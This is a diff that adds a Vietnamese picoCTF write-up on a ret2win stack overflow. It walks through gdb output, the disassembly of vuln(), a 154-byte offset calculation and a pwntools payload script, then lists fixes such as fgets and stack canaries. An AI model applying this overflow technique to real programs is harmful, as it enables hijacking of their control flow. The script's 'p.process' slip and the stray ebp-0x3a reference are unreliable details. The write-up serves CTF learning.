@@ -166,4 +166,109 @@ int main(int argc, char **argv){
     RWX:        Has RWX segments
     Stripped:   No
 ```
+Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win
 ## 2. Dynamic Debugging
+### p win
+Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x80491f6**
+```bash
+(gdb) p win
+$1 = {<text variable, no debug info>} 0x80491f6 <win>
+```
+
+### vuln()
+Tiếp tục dùng lệnh ```disas vuln``` để xem các câu lệnh asm và địa chỉ, ta thấy:
+```bash
+(gdb) disas vuln
+Dump of assembler code for function vuln:
+   0x08049281 <+0>:     endbr32
+   0x08049285 <+4>:     push   %ebp
+   0x08049286 <+5>:     mov    %esp,%ebp
+   0x08049288 <+7>:     push   %ebx
+   0x08049289 <+8>:     sub    $0x94,%esp
+   0x0804928f <+14>:    call   0x8049130 <__x86.get_pc_thunk.bx>
+   0x08049294 <+19>:    add    $0x2d6c,%ebx
+   0x0804929a <+25>:    sub    $0xc,%esp
+   0x0804929d <+28>:    lea    -0x96(%ebp),%eax
+   0x080492a3 <+34>:    push   %eax
+   0x080492a4 <+35>:    call   0x8049050 <gets@plt>
+   0x080492a9 <+40>:    add    $0x10,%esp
+   0x080492ac <+43>:    call   0x8049344 <get_return_address>
+   0x080492b1 <+48>:    sub    $0x8,%esp
+   0x080492b4 <+51>:    push   %eax
+   0x080492b5 <+52>:    lea    -0x1fa0(%ebx),%eax
+   0x080492bb <+58>:    push   %eax
+   0x080492bc <+59>:    call   0x8049040 <printf@plt>
+   0x080492c1 <+64>:    add    $0x10,%esp
+   0x080492c4 <+67>:    nop
+   0x080492c5 <+68>:    mov    -0x4(%ebp),%ebx
+   0x080492c8 <+71>:    leave
+   0x080492c9 <+72>:    ret
+End of assembler dump.
+```
+Vì bài này đặt buffersize biến buf, ta có thể tính toán chính xác size thật sự bằng cách lấy địa chỉ saved eip - buf address. Nhưng trước hết để tìm ra địa chỉ buf ta có thể thông qua hàm gets trong code trên. Đây là những thứ ta cần chú ý
+```bash
+   0x0804929d <+28>:    lea    -0x96(%ebp),%eax
+   0x080492a3 <+34>:    push   %eax
+   0x080492a4 <+35>:    call   0x8049050 <gets@plt>
+```
+Ta sẽ đặt breakpoint tại lệnh lea, như tôi nói lúc trước gets() sẽ đưa chuỗi được nhập vào nơi chứa cái được yêu cầu(ở đây là gets(buf)) nên tất cả các chuỗi mình nhập sẽ được đưa vào điểm bắt đầu của buffer, cũng là cái ebp-0x3a ở trên
+
+Để dễ dàng quan sát ta dùng lệnh r sau khi đặt breakpoint, dùng lệnh ni (next instruction) để cái địa chỉ của ebp-0x3a được đưa vào thanh ghi eax. Lúc này, dùng lệnh info registers $eax (i r $eax) để xem giá trị eax store là bao nhiêu
+```bash
+(gdb) ni
+0x080492a3 in vuln ()
+(gdb) i r eax
+eax            0xffdc51d2          -2338350
+```
+Và con số 0xffdc51d2 chính là địa chỉ của đầu buffer. Tiếp tục dùng info frame (i frame) để giá trị và địa chỉ các thanh ghi trong stack
+```bash
+(gdb) i frame
+Stack level 0, frame at 0xffdc5270:
+ eip = 0x80492a3 in vuln; saved eip = 0x8049335
+ called by frame at 0xffdc52a0
+ Arglist at 0xffdc51c0, args:
+ Locals at 0xffdc51c0, Previous frame's sp is 0xffdc5270
+ Saved registers:
+  ebx at 0xffdc5264, ebp at 0xffdc5268, eip at 0xffdc526c
+```
+Mấy dòng ở trên là giá trị các thanh ghi chứa, ta chỉ quan tâm cái ```eip at 0xffdc526c``` vì đây là đỉnh stack, chứa return address. Sử dụng lệnh p 0xffdc526c-0xffdc51d2 sẽ ra chính xác offset cần tìm:
+```bash
+(gdb) p 0xffdc526c-0xffdc51d2
+$1 = 154
+```
+## 3. Chiến thuật khai thác
+Con số 154 chính xác là cái rbp-0x96 mà lệnh lea ở chỉ vào + 4 byte của saved ebp (4 bytes vì đây là kiến trúc 32bit i386, còn đối với kiến trúc 64 bit thì save rbp luôn là 8 bytes) = 154 byte
+Như vậy ta thấy địa chỉ buffer cố định trên lea ebp-(offset-4). Nhưng vì bài này giới hạn thời gian nên chúng ta sẽ sử dụng payload script để tìm ra flag, và tôi cũng sẽ thử lại một phiên mới để nhanh tìm ra offset
+### Payload
+Sử dụng python để viết script là lựa chọn tốt nhất, ta hàm thư viện pwn kết hợp các hàm process, sendline và interactive để khai thác
+```python
+from pwn import *
+
+p.process('./filename')
+
+win = p32(0x80491f6)
+payload = b'a'*... + b'b'*4 + win
+
+p.sendline(payload)
+
+p.interactive()
+```
+Kết quả thu dược:
+```bash
+ctf-player@pico-chall$ python3 k.py
+[+] Starting local process './19': pid 134
+[*] Switching to interactive mode
+Please enter your string:
+Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
+picoCTF{}[*] Got EOF while reading in interactive
+```
+Tự làm để lấy flag đi nhé!
+## 4. Kết luận
+Lỗ hổng: Sử dụng hàm gets() tại hàm vuln(). Hàm này vô cùng rủi ro vì nó không kiểm tra kích thước dữ liệu so với vùng đệm BUFSIZE
+
+Hậu quả: Ghi đè lên Saved EBP và Saved EIP dễ dàng nếu như không có Canary = ret2win
+
+Giải pháp:
+* Sử dụng các hàm khác an toàn hơn như fgets(buf, sizeof(buf), stdin) thay cho gets vì nó lấy theo kích thước buf (sizeof)
+* Bật Stack Canaries (-fstack-protector) để phát hiện BOF trước khi hàm trả về [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
+* Và một số giải pháp khác tôi chưa học đến
